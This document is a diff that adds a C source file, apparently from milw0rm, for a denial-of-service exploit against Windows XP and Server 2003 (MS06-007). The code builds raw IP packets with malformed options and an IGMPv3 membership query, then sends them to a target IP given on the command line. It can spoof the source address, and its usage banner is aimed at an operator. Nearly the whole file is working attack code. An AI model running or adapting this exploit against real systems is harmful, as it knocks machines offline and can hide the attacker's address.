@@ -1,0 +1,226 @@
+/*
+        IGMP v3 DoS Exploit
+
+        ref: http://www.juniper.net/security/auto/vulnerabilities/vuln2866.html
+        ref: http://www.microsoft.com/technet/security/Bulletin/MS06-007.mspx
+
+
+        by Alexey Sintsov (dookie@inbox.ru)
+
+
+        Req:
+
+                Administrator rights on system
+                Windows Firewall off (for sending RAW packets)
+
+        Affected Products:
+                Microsoft Corporation Windows XP All
+                Microsoft Corporation Windows Server 2003 All
+ */
+
+
+#include <stdio.h>
+#include <winsock2.h>
+
+
+#pragma comment(lib, "Ws2_32.lib")
+
+typedef struct iphdr
+{
+
+        unsigned char  verlen;                  // IP version & length
+        unsigned char  tos;                             // Type of service
+        unsigned short total_len;               // Total length of the packet
+        unsigned short ident;                   // Unique identifier
+        unsigned short frag_and_flags;  // Flags
+        unsigned char  ttl;                             // Time to live
+        unsigned char  proto;                   // Protocol (TCP, UDP etc)
+        unsigned short checksum;                // IP checksum
+        unsigned int   sourceIP;                // Source IP
+        unsigned int   destIP;                  // Destination IP
+        unsigned short  options[2];
+
+} IPHEADER;
+
+
+
+
+typedef struct igmphdr {
+          unsigned char                 type;
+          unsigned char                 code;
+                  unsigned short        checksum;
+                  unsigned long                 group;
+                  unsigned char                 ResvSQVR;
+                  unsigned char                 QQIC;
+                  unsigned short                num;
+                  unsigned long                 addes;
+
+ } IGMPHEADER;
+
+
+
+
+
+
+USHORT checksum(USHORT *buffer, int size)
+{
+    unsigned long cksum=0;
+
+    while (size > 1) {
+        cksum += *buffer++;
+        size  -= sizeof(USHORT);
+    }
+
+    if (size)
+        cksum += *(UCHAR*)buffer;
+
+    cksum = (cksum >> 16) + (cksum & 0xffff);
+    cksum += (cksum >>16);
+
+    return (USHORT)(~cksum);
+}
+
+int sendIGMP(char* a, char* b)
+{
+
+
+        unsigned int dst_addr, src_addr;
+
+        IPHEADER ipHeader;
+        IGMPHEADER igmpHeader;
+
+
+
+        dst_addr=inet_addr (b);
+        src_addr=inet_addr (a);
+
+
+        char szSendBuf[60]={0};
+        int rect;
+
+        WSADATA WSAData;
+        if (WSAStartup(MAKEWORD(2,2), &WSAData) != 0)
+                return FALSE;
+
+        SOCKET sock;
+        if ((sock = WSASocket(AF_INET,SOCK_RAW,
+                IPPROTO_RAW,NULL,0, 0x01)) == INVALID_SOCKET) {
+                printf("Create socket error");
+                WSACleanup();
+                return FALSE;
+        }
+
+
+        BOOL flag=TRUE;
+        if (setsockopt(sock,IPPROTO_IP,2,(char *)&flag,sizeof(flag)) ==
+SOCKET_ERROR) {
+                printf("Set options error");
+                closesocket(sock);
+                WSACleanup();
+                return FALSE;
+        }
+
+
+
+        SOCKADDR_IN ssin;
+        memset(&ssin, 0, sizeof(ssin));
+        ssin.sin_family=AF_INET;
+        ssin.sin_port=htons(99);
+        ssin.sin_addr.s_addr=dst_addr;
+
+
+        ipHeader.verlen=(4<<4 | sizeof(ipHeader)/sizeof(unsigned long));
+
+
+        ipHeader.total_len=htons(sizeof(ipHeader)+sizeof(igmpHeader));
+
+
+        ipHeader.ident=htons(0);
+
+        ipHeader.frag_and_flags=0;
+
+        ipHeader.ttl=128;
+        ipHeader.proto=IPPROTO_IGMP;
+
+        ipHeader.checksum=0;
+
+
+        ipHeader.tos=0;
+
+        ipHeader.destIP=dst_addr;
+        ipHeader.sourceIP=src_addr;
+
+        //Ip options
+        ipHeader.options[0]=htons(0x0000); //bug is here =)
+        ipHeader.options[1]=htons(0x0000);
+
+
+        igmpHeader.type=0x11; //v3 Membership Query
+        igmpHeader.code=5;
+        igmpHeader.num=htons(1);
+        igmpHeader.ResvSQVR=0x0;
+        igmpHeader.QQIC=0;
+        igmpHeader.group=inet_addr("0.0.0.0");
+        igmpHeader.addes=dst_addr;
+
+        igmpHeader.checksum=0;
+
+
+        memcpy(szSendBuf, &igmpHeader, sizeof(igmpHeader));
+
+        igmpHeader.checksum=checksum((USHORT *)szSendBuf,sizeof(igmpHeader));
+
+        memcpy(szSendBuf, &ipHeader, sizeof(ipHeader));
+        memcpy(szSendBuf+sizeof(ipHeader), &igmpHeader, sizeof(igmpHeader));
+        memset(szSendBuf+sizeof(ipHeader)+sizeof(igmpHeader), 0, 4);
+
+        ipHeader.checksum=ntohs(checksum((USHORT *)szSendBuf,
+sizeof(ipHeader)+sizeof(igmpHeader)));
+
+        memcpy(szSendBuf, &ipHeader, sizeof(ipHeader));
+
+
+        rect=sendto(sock, szSendBuf,
+sizeof(ipHeader)+sizeof(igmpHeader),0,(LPSOCKADDR)&ssin, sizeof(ssin));
+
+        if (rect==SOCKET_ERROR) {
+                printf("Send error: <%d>\n",WSAGetLastError());
+        closesocket(sock);
+                WSACleanup();
+                return 0;
+        }
+
+
+
+        closesocket(sock);
+        WSACleanup();
+
+
+
+return 1;
+
+
+}
+
+
+
+main(int argc, char **argv)
+{
+
+
+        if(argc<2)
+        {
+                printf("\nIGMP v3 DoS Exploit (MS06-007) by Alexey Sintsov(dookie@inbox.ru)\n\n");
+                printf("Usage:\n");
+                printf("c:\\igmps.exe <target ip> <source ip>\n\n");
+                exit(0);
+        }
+
+
+        sendIGMP(argv[2],  argv[1]);
+
+
+        return 0;
+}
+
+// milw0rm.com [2006-03-21]
